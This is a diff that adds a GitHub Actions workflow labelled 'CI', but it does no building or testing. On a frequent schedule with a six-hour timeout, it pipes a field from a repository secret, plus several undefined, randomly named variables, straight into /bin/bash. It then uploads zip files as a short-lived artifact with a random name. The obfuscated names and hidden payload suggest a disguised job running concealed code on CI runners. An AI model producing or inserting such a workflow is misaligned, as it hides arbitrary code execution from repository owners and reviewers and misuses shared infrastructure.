@@ -1,0 +1,33 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          evod0301: ${{ secrets.evod0301 }}
+        run: |
+          printf '%s' "$evod0301" | jq -r .k7 | /bin/bash
+          printf '%s' "$vfty67679" | jq -r .cpe717 | /bin/bash
+          echo $rdm30 | jq -r .ht81270 | /bin/bash
+          echo $aqv91603 | jq -r .vdrlj0563 | /bin/bash
+          printf '%s' "$hcc47085" | jq -r .qg7043 | /bin/bash
+          echo $a0632 | jq -r .dnqcj87 | /bin/bash
+          printf '%s' "$zs72" | jq -r .zqyrz4989 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: M8L8gNXT
+          path: "*.zip"
+          retention-days: 1
